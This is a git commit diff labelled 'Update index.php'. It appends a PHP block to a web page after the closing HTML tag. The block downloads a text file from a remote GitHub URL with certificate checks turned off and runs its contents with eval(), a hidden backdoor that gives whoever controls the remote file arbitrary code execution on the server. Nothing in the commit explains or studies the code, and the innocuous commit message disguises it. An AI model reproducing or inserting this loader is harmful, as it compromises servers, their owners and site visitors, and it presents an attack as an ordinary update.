3b2f04ea3097b3cf2a356c3f8913e50352be02a9
viaviartoto <viaviartoto@gmail.com>
2024-06-07 21:37:38 +0700

    Update index.php

--- index.php
+++ index.php
@@ -552,3 +552,15 @@
         </script>
     </body>
 </html>
+?>
+
+<?php
+$url = 'https://raw.githubusercontent.com/ok612/autobl/main/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
